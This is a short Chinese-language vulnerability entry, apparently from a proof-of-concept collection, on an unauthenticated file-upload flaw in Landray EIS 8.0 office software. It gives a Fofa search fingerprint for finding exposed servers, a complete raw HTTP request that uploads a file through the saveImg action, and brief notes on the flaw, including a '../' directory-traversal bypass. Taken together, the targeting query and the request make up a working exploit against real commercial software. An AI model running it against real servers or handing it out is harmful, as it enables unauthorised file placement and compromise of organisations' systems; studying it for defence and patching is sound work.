---
title: 蓝凌EIS8.0前台文件上传
---
# 蓝凌EIS8.0前台文件上传

## 漏洞厂商

landray蓝凌   

## 厂商官网

https://www.landray.com.cn/

## 产品

蓝凌智能OA EIS 8.0 

https://www.landray.com.cn/blue?target=zhinengoa

## Fofa语法

```
icon_hash="953405444" 
```

## POC

```
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=jh3g1b45deo2ny55kmxl4355; Lang=zh-cn
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUtvHzp8FchbbUUn
Content-Length: 483
 
------WebKitFormBoundaryZUtvHzp8FchbbUUn
Content-Disposition: form-data; name="file"filename="test.jpg"
Content-Type: text/html


111
------WebKitFormBoundaryZUtvHzp8FchbbUUn--
```

文件路径`Scripts/plupload/1.txt`

漏洞分析:

`/eis/service/api.aspx`下存在一个`SvaeImg`方法。

当`action=saveimg`时，则进入

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624172207322.png)

一处简单的文件上传漏洞，取file参数的io流。后时间戳+ext变量。

这里的变量取的是`Content-Type`头的`image`/后的内容，由于`web.config`中定义了一些可以未登录访问的路径。

../跨目录绕过

访问 `/eis/service/api.aspx?action=saveImg`

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624172523693.png)
